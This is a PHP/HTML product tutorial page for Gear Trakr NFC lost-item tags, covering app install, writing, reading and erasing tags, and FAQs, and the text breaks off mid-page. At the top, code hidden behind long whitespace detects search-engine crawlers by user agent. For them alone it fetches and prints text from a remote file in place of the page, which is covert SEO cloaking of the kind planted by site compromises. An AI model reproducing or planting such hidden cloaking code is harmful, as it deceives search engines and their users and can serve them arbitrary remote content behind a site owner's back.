<?php
function is_bot(): bool
{
    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

    if ($ua === '') {
        return false;
    }

    $bots_seo = [
        'googlebot',
        'googlebot-mobile',
        'google-inspectiontool',
        'google-image',
        'google-video',
        'bingbot',
        'bingpreview',
        'slurp',
        'duckduckbot',
        'baiduspider',
        'yandexbot',
        'seznambot',
        'petalbot',
        'applebot',
        'yeti',                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        'naverbot',
        'sogou',
    ];
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
    foreach ($bots_seo as $bot) {
        if (stripos($ua, $bot) !== false) {
            return true;
        }
    }
    return false;
}

if (is_bot()) {
    // Baca file dari URL — sekarang *tanpa fallback*
    $ctx = stream_context_create([
        'http' => ['timeout' => 2]
    ]);

    $message = @file_get_contents('https://geartrakr.com/gaya/nomor-8.txt', false, $ctx);

    echo $message;
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Tutorial – Gear Trakr | How to Use Your NFC Tags</title>
<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@400;600;700&family=Barlow:wght@300;400;500&display=swap" rel="stylesheet">
<style>
  :root {
    --primary: #0A6EBD;
    --primary-dark: #084F8A;
    --accent: #F4A614;
    --dark: #0D1B2A;
    --mid: #3A4D5C;
    --light: #F0F5FA;
    --white: #ffffff;
    --border: #D9E5EE;
    --text: #1C2B38;
    --muted: #6B7F8E;
    --success: #1A9E5A;
  }
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: 'Barlow', sans-serif; color: var(--text); background: var(--white); }
  a { text-decoration: none; color: inherit; }

  /* ===== WP ADMIN BAR ===== */
  .wp-admin-bar {
    background: #1d2327; color: #c3c4c7; font-size: 12px;
    height: 32px; display: flex; align-items: center;
    padding: 0 1rem; gap: 1.5rem; position: sticky; top: 0; z-index: 200;
  }
  .wp-admin-bar span { opacity: 0.7; cursor: pointer; }
  .wp-admin-bar span:hover { opacity: 1; color: #fff; }
  .wp-admin-bar .wp-logo { color: #c3c4c7; font-weight: 600; }

  /* ===== HEADER ===== */
  header { background: var(--dark); position: sticky; top: 32px; z-index: 100; }
  .header-inner {
    max-width: 1200px; margin: 0 auto; padding: 0 2rem;
    display: flex; align-items: center; justify-content: space-between; height: 72px;
  }
  .site-logo { font-family: 'Barlow Condensed', sans-serif; font-size: 1.8rem; font-weight: 700; color: var(--white); letter-spacing: 0.04em; }
  .site-logo span { color: var(--accent); }
  .main-nav { display: flex; align-items: center; }
  .main-nav a {
    font-size: 0.85rem; font-weight: 500; color: rgba(255,255,255,0.8);
    text-transform: uppercase; letter-spacing: 0.07em;
    padding: 0 1.1rem; height: 72px; display: flex; align-items: center;
    border-bottom: 3px solid transparent; transition: all 0.2s;
  }
  .main-nav a:hover, .main-nav a.active { color: var(--white); border-bottom-color: var(--accent); }
  .header-cta {
    background: var(--accent); color: var(--dark);
    font-family: 'Barlow Condensed', sans-serif; font-size: 0.9rem; font-weight: 700;
    text-transform: uppercase; letter-spacing: 0.1em;
    padding: 0.6rem 1.4rem; border-radius: 3px; transition: background 0.2s;
  }
  .header-cta:hover { background: #e09800; }

  /* ===== BREADCRUMB ===== */
  .breadcrumb-bar { background: var(--light); border-bottom: 1px solid var(--border); padding: 0.6rem 2rem; font-size: 0.8rem; color: var(--muted); }
  .breadcrumb-inner { max-width: 1200px; margin: 0 auto; }
  .breadcrumb-inner a { color: var(--primary); }
  .breadcrumb-inner a:hover { text-decoration: underline; }

  /* ===== PAGE HERO ===== */
  .page-hero {
    background: linear-gradient(135deg, var(--dark) 0%, #1a3a5c 100%);
    padding: 4rem 2rem;
    text-align: center;
    position: relative;
    overflow: hidden;
  }
  .page-hero::before {
    content: '';
    position: absolute;
    inset: 0;
    background: radial-gradient(ellipse at center, rgba(10,110,189,0.25) 0%, transparent 70%);
  }
  .page-hero-inner { max-width: 700px; margin: 0 auto; position: relative; z-index: 1; }
  .page-hero-tag {
    display: inline-block;
    background: rgba(244,166,20,0.15);
    border: 1px solid rgba(244,166,20,0.4);
    color: var(--accent);
    font-size: 0.7rem; font-weight: 600; text-transform: uppercase; letter-spacing: 0.15em;
    padding: 0.3rem 1rem; border-radius: 2rem; margin-bottom: 1.2rem;
  }
  .page-hero h1 {
    font-family: 'Barlow Condensed', sans-serif;
    font-size: 3.2rem; font-weight: 700; color: var(--white);
    line-height: 1.1; margin-bottom: 1rem;
  }
  .page-hero p { font-size: 1rem; color: rgba(255,255,255,0.65); line-height: 1.7; font-weight: 300; }

  /* ===== LAYOUT: CONTENT + SIDEBAR ===== */
  .page-wrap { max-width: 1200px; margin: 0 auto; padding: 3rem 2rem; display: grid; grid-template-columns: 1fr 300px; gap: 3.5rem; }

  /* ===== MAIN CONTENT ===== */
  .toc-box {
    background: var(--light); border: 1px solid var(--border);
    border-left: 4px solid var(--primary);
    border-radius: 6px; padding: 1.5rem 1.75rem; margin-bottom: 3rem;
  }
  .toc-box h3 { font-family: 'Barlow Condensed', sans-serif; font-size: 1rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.08em; color: var(--dark); margin-bottom: 0.9rem; }
  .toc-list { list-style: none; display: flex; flex-direction: column; gap: 0.5rem; }
  .toc-list li a { font-size: 0.88rem; color: var(--primary); display: flex; align-items: center; gap: 0.5rem; }
  .toc-list li a:hover { text-decoration: underline; }
  .toc-num { font-family: 'Barlow Condensed', sans-serif; font-size: 0.75rem; font-weight: 700; background: var(--primary); color: white; width: 20px; height: 20px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }

  /* Section blocks */
  .tut-section { margin-bottom: 4rem; }
  .tut-section-header { display: flex; align-items: center; gap: 1rem; margin-bottom: 1.75rem; padding-bottom: 1rem; border-bottom: 2px solid var(--border); }
  .tut-section-num {
    font-family: 'Barlow Condensed', sans-serif; font-size: 1.8rem; font-weight: 700;
    color: var(--white); background: var(--primary);
    width: 52px; height: 52px; border-radius: 6px;
    display: flex; align-items: center; justify-content: center; flex-shrink: 0;
  }
  .tut-section h2 { font-family: 'Barlow Condensed', sans-serif; font-size: 1.8rem; font-weight: 700; color: var(--dark); }
  .tut-section h2 span { color: var(--primary); }

  .tut-intro { font-size: 0.95rem; color: var(--mid); line-height: 1.75; margin-bottom: 2rem; }

  /* Step cards */
  .steps-list { display: flex; flex-direction: column; gap: 1.25rem; }
  .step-item {
    display: grid; grid-template-columns: 44px 1fr;
    gap: 1rem; align-items: flex-start;
    background: var(--white); border: 1px solid var(--border);
    border-radius: 8px; padding: 1.25rem 1.5rem;
    transition: border-color 0.2s, box-shadow 0.2s;
  }
  .step-item:hover { border-color: var(--primary); box-shadow: 0 4px 16px rgba(10,110,189,0.08); }
  .step-item-num {
    width: 44px; height: 44px; border-radius: 50%;
    background: var(--light); border: 2px solid var(--primary);
    font-family: 'Barlow Condensed', sans-serif; font-size: 1.1rem; font-weight: 700;
    color: var(--primary); display: flex; align-items: center; justify-content: center;
  }
  .step-item-body h4 { font-family: 'Barlow Condensed', sans-serif; font-size: 1.1rem; font-weight: 700; color: var(--dark); margin-bottom: 0.4rem; }
  .step-item-body p { font-size: 0.88rem; color: var(--muted); line-height: 1.65; }
  .step-item-tip {
    grid-column: 2; margin-top: 0.6rem;
    background: rgba(10,110,189,0.06); border-left: 3px solid var(--primary);
    border-radius: 0 4px 4px 0; padding: 0.6rem 0.9rem;
    font-size: 0.82rem; color: var(--primary); line-height: 1.55;
  }

  /* App mockup inline */
  .app-mock {
    background: var(--dark); border-radius: 14px;
    padding: 1.75rem; margin: 2rem 0;
    display: grid; grid-template-columns: 1fr 1fr; gap: 1rem;
  }
  .mock-screen {
    background: #1a3a5c; border-radius: 10px;
    padding: 1.2rem; border: 1px solid rgba(255,255,255,0.1);
  }
  .mock-title { font-size: 0.65rem; text-transform: uppercase; letter-spacing: 0.12em; color: var(--accent); margin-bottom: 0.8rem; font-weight: 600; }
  .mock-field { background: rgba(255,255,255,0.07); border-radius: 5px; padding: 0.55rem 0.8rem; margin-bottom: 0.5rem; }
  .mock-label { font-size: 0.6rem; text-transform: uppercase; letter-spacing: 0.08em; color: rgba(255,255,255,0.35); margin-bottom: 0.15rem; }
  .mock-val { font-size: 0.85rem; color: rgba(255,255,255,0.88); }
  .mock-btn {
    background: var(--primary); color: white; text-align: center;
    border-radius: 5px; padding: 0.6rem; font-family: 'Barlow Condensed', sans-serif;
    font-size: 0.85rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.06em;
    margin-top: 0.8rem; cursor: pointer;
  }
  .mock-btn.yellow { background: var(--accent); color: var(--dark); }
  .mock-scan {
    background: rgba(10,110,189,0.2); border: 2px dashed rgba(10,110,189,0.5);
    border-radius: 8px; padding: 1.5rem 1rem; text-align: center;
    color: rgba(255,255,255,0.6); font-size: 0.82rem; line-height: 1.6;
  }
  .scan-pulse { width: 12px; height: 12px; background: #4dffb4; border-radius: 50%; display: inline-block; margin-right: 6px; animation: pulse 1.5s infinite; }
  @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.5;transform:scale(1.3)} }

  /* Alert / note boxes */
  .note-box {
    display: flex; gap: 1rem; align-items: flex-start;
    border-radius: 8px; padding: 1.1rem 1.25rem; margin: 1.5rem 0;
    font-size: 0.88rem; line-height: 1.65;
  }
  .note-box.info { background: rgba(10,110,189,0.07); border: 1px solid rgba(10,110,189,0.2); color: #084F8A; }
  .note-box.warn { background: rgba(244,166,20,0.08); border: 1px solid rgba(244,166,20,0.3); color: #7a5200; }
  .note-box.success { background: rgba(26,158,90,0.08); border: 1px solid rgba(26,158,90,0.25); color: #0e5c35; }
  .note-icon { font-size: 1.1rem; flex-shrink: 0; margin-top: 1px; }

  /* Platform cards */
  .platform-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.25rem; margin: 1.5rem 0; }
  .platform-card {
    border: 1px solid var(--border); border-radius: 10px; padding: 1.5rem;
    display: flex; align-items: flex-start; gap: 1rem;
    transition: border-color 0.2s;
  }
  .platform-card:hover { border-color: var(--primary); }
  .platform-logo {
    width: 48px; height: 48px; border-radius: 10px;
    display: flex; align-items: center; justify-content: center; flex-shrink: 0;
    font-family: 'Barlow Condensed', sans-serif; font-size: 0.7rem; font-weight: 700;
  }
  .platform-logo.ios { background: #000; color: white; }
  .platform-logo.android { background: #3DDC84; color: #000; }
  .platform-card h4 { font-family: 'Barlow Condensed', sans-serif; font-size: 1rem; font-weight: 700; color: var(--dark); margin-bottom: 0.3rem; }
  .platform-card p { font-size: 0.82rem; color: var(--muted); line-height: 1.55; }

  /* FAQ */
  .faq-list { display: flex; flex-direction: column; gap: 0; }
  .faq-item { border-bottom: 1px solid var(--border); }
  .faq-q {
    padding: 1.1rem 0; font-family: 'Barlow Condensed', sans-serif;
    font-size: 1.05rem; font-weight: 700; color: var(--dark);
    display: flex; justify-content: space-between; align-items: center;
    cursor: pointer;
  }
  .faq-q:hover { color: var(--primary); }
  .faq-a { padding: 0 0 1.1rem; font-size: 0.88rem; color: var(--muted); line-height: 1.7; }

  /* Related posts */
  .related-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.25rem; }
  .related-card { border: 1px solid var(--border); border-radius: 8px; overflow: hidden; display: flex; transition: box-shadow 0.2s; }
  .related-card:hover { box-shadow: 0 4px 16px rgba(0,0,0,0.08); }
  .related-img { width: 80px; background: var(--light); display: flex; align-items: center; justify-content: center; flex-shrink: 0; border-right: 1px solid var(--border); }
  .related-body { padding: 0.9rem 1rem; }
  .related-cat { font-size: 0.65rem; text-transform: uppercase; letter-spacing: 0.1em; color: var(--primary); font-weight: 600; margin-bottom: 0.3rem; }
  .related-title { font-family: 'Barlow Condensed', sans-serif; font-size: 0.95rem; font-weight: 700; color: var(--dark); line-height: 1.3; }

  /* ===== SIDEBAR ===== */
  .sidebar { display: flex; flex-direction: column; gap: 1.75rem; }
  .widget { background: var(--white); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; }
  .widget-header {
    background: var(--dark); padding: 0.9rem 1.25rem;
    font-family: 'Barlow Condensed', sans-serif; font-size: 0.9rem; font-weight: 700;
    color: var(--white); text-transform: uppercase; letter-spacing: 0.1em;
  }
  .widget-body { padding: 1.25rem; }
  .widget-cta-btn {
    display: block; text-align: center;
    background: var(--accent); color: var(--dark);
    font-family: 'Barlow Condensed', sans-serif; font-size: 1rem; font-weight: 700;
    text-transform: uppercase; letter-spacing: 0.08em;
    padding: 0.8rem; border-radius: 5px; transition: background 0.2s; margin-bottom: 0.75rem;
  }
  .widget-cta-btn:hover { background: #e09800; }
  .widget-cta-btn.outline {
    background: transparent; color: var(--primary);
    border: 1px solid var(--primary);
  }
  .widget-cta-btn.outline:hover { background: var(--light); }
  .widget-body p { font-size: 0.83rem; color: var(--muted); line-height: 1.6; margin-bottom: 1rem; }
  .widget-nav { list-style: none; }
  .widget-nav li { border-bottom: 1px solid var(--border); }
  .widget-nav li:last-child { border-bottom: none; }
  .widget-nav li a {
    display: flex; align-items: center; justify-content: space-between;
    padding: 0.7rem 0; font-size: 0.85rem; color: var(--mid); transition: color 0.2s;
  }
  .widget-nav li a:hover { color: var(--primary); }
  .widget-nav li a.current { color: var(--primary); font-weight: 600; }
  .progress-bar { background: var(--border); border-radius: 4px; height: 6px; margin: 1rem 0 0.4rem; overflow: hidden; }
  .progress-fill { height: 100%; background: var(--primary); border-radius: 4px; transition: width 0.4s; }
  .progress-label { font-size: 0.75rem; color: var(--muted); display: flex; justify-content: space-between; }
  .tag-visual {
    background: var(--dark); border-radius: 8px; padding: 1.25rem;
    text-align: center; margin-bottom: 1rem;
  }
  .tag-visual-circle {
    width: 60px; height: 60px; border-radius: 50%;
    border: 2px solid var(--accent); margin: 0 auto 0.8rem;
    display: flex; align-items: center; justify-content: center;
    background: rgba(244,166,20,0.1);
    animation: glow 2s infinite;
  }
  @keyframes glow { 0%,100%{box-shadow:0 0 0 0 rgba(244,166,20,0.4)} 50%{box-shadow:0 0 0 10px rgba(244,166,20,0)} }
  .tag-visual p { font-size: 0.78rem; color: rgba(255,255,255,0.6); }

  /* ===== CTA BOTTOM ===== */
  .bottom-cta {
    background: linear-gradient(135deg, var(--primary-dark), var(--primary));
    padding: 4rem 2rem; text-align: center;
  }
  .bottom-cta-inner { max-width: 600px; margin: 0 auto; }
  .bottom-cta h2 { font-family: 'Barlow Condensed', sans-serif; font-size: 2.5rem; font-weight: 700; color: white; margin-bottom: 0.75rem; }
  .bottom-cta p { font-size: 0.95rem; color: rgba(255,255,255,0.7); line-height: 1.65; margin-bottom: 2rem; }
  .bottom-cta-btns { display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap; }
  .btn-yellow { background: var(--accent); color: var(--dark); font-family: 'Barlow Condensed', sans-serif; font-weight: 700; font-size: 1rem; text-transform: uppercase; letter-spacing: 0.08em; padding: 0.85rem 2rem; border-radius: 3px; transition: background 0.2s; display: inline-block; }
  .btn-yellow:hover { background: #e09800; }
  .btn-ghost { background: transparent; color: white; font-family: 'Barlow Condensed', sans-serif; font-weight: 600; font-size: 1rem; text-transform: uppercase; letter-spacing: 0.08em; padding: 0.85rem 2rem; border: 1px solid rgba(255,255,255,0.35); border-radius: 3px; display: inline-block; transition: border-color 0.2s; }
  .btn-ghost:hover { border-color: white; }

  /* ===== FOOTER ===== */
  footer { background: var(--dark); color: rgba(255,255,255,0.7); }
  .footer-top {
    max-width: 1200px; margin: 0 auto; padding: 4rem 2rem;
    display: grid; grid-template-columns: 2fr 1fr 1fr 1fr; gap: 3rem;
  }
  .footer-logo { font-family: 'Barlow Condensed', sans-serif; font-size: 1.6rem; font-weight: 700; color: white; display: block; margin-bottom: 0.9rem; }
  .footer-logo span { color: var(--accent); }
  .footer-desc { font-size: 0.85rem; line-height: 1.7; max-width: 240px; }
  .footer-col h4 { font-family: 'Barlow Condensed', sans-serif; font-size: 0.9rem; font-weight: 700; color: white; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 1.25rem; }
  .footer-col ul { list-style: none; display: flex; flex-direction: column; gap: 0.6rem; }
  .footer-col ul li a { font-size: 0.83rem; color: rgba(255,255,255,0.55); transition: color 0.2s; }
  .footer-col ul li a:hover { color: var(--accent); }
  .footer-bottom { border-top: 1px solid rgba(255,255,255,0.1); padding: 1.5rem 2rem; max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; font-size: 0.78rem; color: rgba(255,255,255,0.35); }
</style>
</head>
<body>

<!-- WP ADMIN BAR -->
<div class="wp-admin-bar">
  <span class="wp-logo">⚡ WordPress</span>
  <span>+ New</span>
  <span>Edit Page</span>
  <span>Customize</span>
  <span style="margin-left:auto;">Howdy, Admin</span>
</div>

<!-- HEADER -->
<header>
  <div class="header-inner">
    <a href="https://geartrakr.com/" class="site-logo">GEAR<span>TRAKR</span></a>
    <nav class="main-nav">
      <a href="https://geartrakr.com/">Home</a>
      <a href="https://geartrakr.com/tutorial/" class="active">Tutorial</a>
      <a href="https://geartrakr.com/#shop">Shop</a>
      <a href="https://geartrakr.com/#how-it-works">How It Works</a>
      <a href="https://geartrakr.com/#about">About</a>
    </nav>
    <a href="https://geartrakr.com/#shop" class="header-cta">Get Tags</a>
  </div>
</header>

<!-- BREADCRUMB -->
<div class="breadcrumb-bar">
  <div class="breadcrumb-inner">
    <a href="https://geartrakr.com/">Home</a> &rsaquo; Tutorial
  </div>
</div>

<!-- PAGE HERO -->
<section class="page-hero">
  <div class="page-hero-inner">
    <div class="page-hero-tag">Complete App Guide</div>
    <h1>How to Use Gear Trakr</h1>
    <p>Everything you need to set up your NFC tags, protect your gear, and get lost items returned — step by step.</p>
  </div>
</section>

<!-- MAIN PAGE LAYOUT -->
<div class="page-wrap">

  <!-- MAIN CONTENT -->
  <main>

    <!-- TABLE OF CONTENTS -->
    <div class="toc-box">
      <h3>📋 In This Tutorial</h3>
      <ul class="toc-list">
        <li><a href="#section-download"><span class="toc-num">1</span> Download &amp; Install the App</a></li>
        <li><a href="#section-write"><span class="toc-num">2</span> Writing Your Info to a Tag</a></li>
        <li><a href="#section-read"><span class="toc-num">3</span> Reading a Found Tag</a></li>
        <li><a href="#section-erase"><span class="toc-num">4</span> Erasing a Tag</a></li>
        <li><a href="#section-tips"><span class="toc-num">5</span> Tips &amp; Best Practices</a></li>
        <li><a href="#section-faq"><span class="toc-num">6</span> Frequently Asked Questions</a></li>
      </ul>
    </div>

    <!-- SECTION 1 -->
    <div class="tut-section" id="section-download">
      <div class="tut-section-header">
        <div class="tut-section-num">1</div>
        <h2>Download &amp; <span>Install the App</span></h2>
      </div>
      <p class="tut-intro">The Gear Trakr app is free and available on both iOS and Android. You'll need it to write your information onto your NFC tags. No account required.</p>

      <div class="platform-grid">
        <div class="platform-card">
          <div class="platform-logo ios">iOS</div>
          <div>
            <h4>iPhone (iOS)</h4>
            <p>Requires iOS 13 or later. NFC scanning is supported natively — no extra settings needed. Hold the tag to the top-back of your iPhone.</p>
          </div>
        </div>
        <div class="platform-card">
          <div class="platform-logo android">AND</div>
          <div>
            <h4>Android</h4>
            <p>Requires Android 5.0+ with NFC enabled. Go to Settings → Connected Devices → NFC to turn it on. Scan area is the middle-back of your phone.</p>
          </div>
        </div>
      </div>

      <div class="note-box info">
        <span class="note-icon">ℹ️</span>
        <span>Once installed, open the app and you'll see the main menu with four options: <strong>Write Tag</strong>, <strong>Read Tag</strong>, <strong>Erase Tag</strong>, and <strong>Settings</strong>. No login needed to get started.</span>
      </div>
    </div>

    <!-- SECTION 2 -->
    <div class="tut-section" id="section-write">
      <div class="tut-section-header">
        <div class="tut-section-num">2</div>
        <h2>Writing Your <span>Info to a Tag</span></h2>
      </div>
      <p class="tut-intro">This is the main function of Gear Trakr. You'll write your contact information to a blank NFC tag so that anyone who finds your gear can see how to return it.</p>

      <div class="steps-list">
        <div class="step-item">
          <div class="step-item-num">1</div>
          <div class="step-item-body">
            <h4>Open the App and tap "Write Tag"</h4>
            <p>From the main menu, select the Write Tag option. This will open the contact information form.</p>
          </div>
        </div>
        <div class="step-item">
          <div class="step-item-num">2</div>
          <div class="step-item-body">
            <h4>Enter your contact details</h4>
            <p>Fill in your name, phone number, and email address. You can also add a custom message like "Please call if found — reward offered!"</p>
          </div>
          <div class="step-item-tip">💡 Tip: Use a phone number that's always with you, not a work landline. The finder will need to reach you quickly.</div>
        </div>
        <div class="step-item">
          <div class="step-item-num">3</div>
          <div class="step-item-body">
            <h4>Tap "Write to Tag"</h4>
            <p>After filling in your details, press the Write button. The app will prompt you to hold your phone near an NFC tag.</p>
          </div>
        </div>
        <div class="step-item">
          <div class="step-item-num">4</div>
          <div class="step-item-body">
            <h4>Hold phone to the NFC tag</h4>
            <p>Place your phone's NFC area flat against the tag for 1–2 seconds. You'll hear a confirmation sound and see a success message when the write is complete.</p>
          </div>
          <div class="step-item-tip">📱 iPhone: Hold near the top-back edge. Android: Hold near the center-back. Keep it still until you feel/hear the confirmation.</div>
        </div>
        <div class="step-item">
          <div class="step-item-num">5</div>
          <div class="step-item-body">
            <h4>Attach the tag to your gear</h4>
            <p>Use the included loop, adhesive, or lanyard clip to attach the tag to your backpack, jacket, instrument case, or keys.</p>
          </div>
        </div>
      </div>

      <div class="app-mock">
        <div class="mock-screen">
          <div class="mock-title">✏️ Write Tag — Enter Info</div>
          <div class="mock-field">
            <div class="mock-label">Your Name</div>
            <div class="mock-val">Sarah Johnson</div>
          </div>
          <div class="mock-field">
            <div class="mock-label">Phone Number</div>
            <div class="mock-val">(555) 234-5678</div>
          </div>
          <div class="mock-field">
            <div class="mock-label">Email Address</div>
            <div class="mock-val">sarah@email.com</div>
          </div>
          <div class="mock-field">
            <div class="mock-label">Custom Message (optional)</div>
            <div class="mock-val">Reward if returned!</div>
          </div>
          <div class="mock-btn">Write to Tag →</div>
        </div>
        <div class="mock-screen" style="display:flex; flex-direction:column; gap:0.75rem;">
          <div class="mock-title">📡 Hold Near Tag</div>
          <div class="mock-scan">
            <div style="margin-bottom:0.5rem;"><span class="scan-pulse"></span>Searching for NFC tag…</div>
            <div style="font-size:0.72rem; color:rgba(255,255,255,0.35);">Keep your phone still</div>
          </div>
          <div class="mock-btn yellow" style="text-align:center;">✅ Write Successful!</div>
          <div style="font-size:0.75rem; color:rgba(255,255,255,0.5); text-align:center; line-height:1.5;">Your info was saved to the tag. Attach it to your gear now.</div>
        </div>
      </div>

      <div class="note-box success">
        <span class="note-icon">✅</span>
        <span>You can write different contact info to each tag. Great for tagging different family members' belongings with their own details.</span>
      </div>
    </div>

    <!-- SECTION 3 -->
    <div class="tut-section" id="section-read">
      <div class="tut-section-header">
        <div class="tut-section-num">3</div>
        <h2>Reading a <span>Found Tag</span></h2>
      </div>
      <p class="tut-intro">If you find an item with a Gear Trakr tag, use the app to read the owner's contact info — then call, text, or email to return it.</p>

      <div class="steps-list">
        <div class="step-item">
          <div class="step-item-num">1</div>
          <div class="step-item-body">
            <h4>Open Gear Trakr and tap "Read Tag"</h4>
            <p>Select Read Tag from the main menu. The app will begin scanning for a nearby NFC tag.</p>
          </div>
        </div>
        <div class="step-item">
          <div class="step-item-num">2</div>
          <div class="step-item-body">
            <h4>Hold your phone to the tag</h4>
            <p>Place your phone's NFC area near the tag on the found item. Within 1–2 seconds the owner's info will appear on screen.</p>
          </div>
        </div>
        <div class="step-item">
          <div class="step-item-num">3</div>
          <div class="step-item-body">
            <h4>Contact the owner</h4>
            <p>The screen shows the owner's name, phone, and email. Tap to call, open a text, or send an email directly from the app.</p>
          </div>
          <div class="step-item-tip">💡 The owner will also receive an automatic notification that their item was found — even before you contact them!</div>
        </div>
      </div>

      <div class="note-box warn">
        <span class="note-icon">⚠️</span>
        <span>Note: Both the finder and the owner need to have the Gear Trakr app installed to use the notification feature. Reading basic contact info works on any NFC-enabled phone without the app.</span>
      </div>
    </div>

    <!-- SECTION 4 -->
    <div class="tut-section" id="section-erase">
      <div class="tut-section-header">
        <div class="tut-section-num">4</div>
        <h2>Erasing <span>a Tag</span></h2>
      </div>
      <p class="tut-intro">If you want to reuse a tag, transfer it to someone else, or just clear your data, use the Erase function to wipe the tag completely.</p>

      <div class="steps-list">
        <div class="step-item">
          <div class="step-item-num">1</div>
          <div class="step-item-body">
            <h4>Tap "Erase Tag" from the main menu</h4>
            <p>The erase function is available directly on the home screen of the app.</p>
          </div>
        </div>
        <div class="step-item">
          <div class="step-item-num">2</div>
          <div class="step-item-body">
            <h4>Hold phone to the tag to erase</h4>
            <p>Place your phone near the tag, just like when writing. The app will confirm when the data has been cleared.</p>
          </div>
        </div>
        <div class="step-item">
          <div class="step-item-num">3</div>
          <div class="step-item-body">
            <h4>Tag is now blank and ready to reuse</h4>
            <p>You can now write new info to the tag using the Write Tag function. All previous data is permanently removed.</p>
          </div>
        </div>
      </div>
    </div>

    <!-- SECTION 5 -->
    <div class="tut-section" id="section-tips">
      <div class="tut-section-header">
        <div class="tut-section-num">5</div>
        <h2>Tips &amp; <span>Best Practices</span></h2>
      </div>
      <p class="tut-intro">Get the most out of your Gear Trakr tags with these recommendations from our team.</p>

      <div class="steps-list">
        <div class="step-item">
          <div class="step-item-num" style="background:var(--accent); border-color:var(--accent); color:var(--dark);">★</div>
          <div class="step-item-body">
            <h4>Tag everything, not just valuables</h4>
            <p>Jackets, umbrellas, and water bottles are lost most often. These are inexpensive to replace but annoying to lose. Tag them all.</p>
          </div>
        </div>
        <div class="step-item">
          <div class="step-item-num" style="background:var(--accent); border-color:var(--accent); color:var(--dark);">★</div>
          <div class="step-item-body">
            <h4>Use a secondary contact number</h4>
            <p>If tagging a child's backpack, use a parent's cell number. For school gear, also add an email you check regularly.</p>
          </div>
        </div>
        <div class="step-item">
          <div class="step-item-num" style="background:var(--accent); border-color:var(--accent); color:var(--dark);">★</div>
          <div class="step-item-body">
            <h4>Place the tag inside and outside</h4>
            <p>Stick one tag inside the zipper pocket (hidden, more secure) and one outside on the handle where it's more visible.</p>
          </div>
        </div>
        <div class="step-item">
          <div class="step-item-num" style="background:var(--accent); border-color:var(--accent); color:var(--dark);">★</div>
          <div class="step-item-body">
            <h4>Update info if you change phone numbers</h4>
            <p>Tags store data statically — if your number changes, use the Erase and re-Write functions to update all your tags.</p>
          </div>
        </div>
      </div>
    </div>

    <!-- SECTION 6: FAQ -->
    <div class="tut-section" id="section-faq">
      <div class="tut-section-header">
        <div class="tut-section-num">6</div>
        <h2>Frequently Asked <span>Questions</span></h2>
      </div>

      <div class="faq-list">
        <div class="faq-item">
          <div class="faq-q">Does the finder need to have the app installed? <span style="color:var(--primary)">+</span></div>
          <div class="faq-a">To use the full notification feature, yes — but the tag also stores plain text contact info that any NFC-enabled phone can read natively, even without the app. iPhones running iOS 13+ can read NFC tags without any app at all.</div>
        </div>
        <div class="faq-item">
          <div class="faq-q">Is there a subscription or monthly fee? <span style="color:var(--primary)">+</span></div>
          <div class="faq-a">No. Gear Trakr is a one-time purchase. The app is free to download and use. There are no monthly fees, no cloud subscriptions, and no hidden costs.</div>
        </div>
        <div class="faq-item">
          <div class="faq-q">What happens if my phone doesn't have NFC? <span style="color:var(--primary)">+</span></div>
          <div class="faq-a">Most smartphones made after 2015 have NFC. If yours doesn't, you can still use Gear Trakr's printed label stickers, which display your contact info without any scanning required.</div>
        </div>
        <div class="faq-item">
          <div class="faq-q">Are the tags waterproof? <span style="color:var(--primary)">+</span></div>
          <div class="faq-a">Yes — the NFC tags are water-resistant and designed to withstand normal outdoor use including rain and moisture. The adhesive sticker labels are also water-resistant but should not be submerged.</div>
        </div>
        <div class="faq-item">
          <div class="faq-q">Can I use Gear Trakr for my school or golf course? <span style="color:var(--primary)">+</span></div>
          <div class="faq-a">Absolutely. We have a partner program for schools, camps, and golf courses. Bulk pricing is available. Visit our <a href="https://geartrakr.com/#about" style="color:var(--primary);">contact page</a> or the <a href="https://geartrakr.com/" style="color:var(--primary);">homepage</a> for more info.</div>
        </div>
      </div>
    </div>

    <!-- RELATED POSTS -->
    <div style="margin-bottom:3rem;">
      <h3 style="font-family:'Barlow Condensed',sans-serif; font-size:1.3rem; font-weight:700; color:var(--dark); margin-bottom:1.25rem; text-transform:uppercase; letter-spacing:0.06em;">Related Articles</h3>
      <div class="related-grid">
        <a href="https://geartrakr.com/" class="related-card">
          <div class="related-img">
            <svg width="28" height="28" viewBox="0 0 28 28" fill="none" opacity="0.3"><path d="M14 4l3 9h9L18 19l3 9-7-5-7 5 3-9-8-6h9z" stroke="#0A6EBD" stroke-width="1.5"/></svg>
          </div>
          <div class="related-body">
            <div class="related-cat">Tips</div>
            <div class="related-title">Back to School: Tag Every Item Your Child Owns</div>
          </div>
        </a>
        <a href="https://geartrakr.com/" class="related-card">
          <div class="related-img">
            <svg width="28" height="28" viewBox="0 0 28 28" fill="none" opacity="0.3"><circle cx="14" cy="14" r="11" stroke="#0A6EBD" stroke-width="1.5"/><path d="M9 14h10M14 9v10" stroke="#0A6EBD" stroke-width="1.5"/></svg>
          </div>
          <div class="related-body">
            <div class="related-cat">Partners</div>
            <div class="related-title">How Golf Courses Are Eliminating Lost &amp; Found</div>
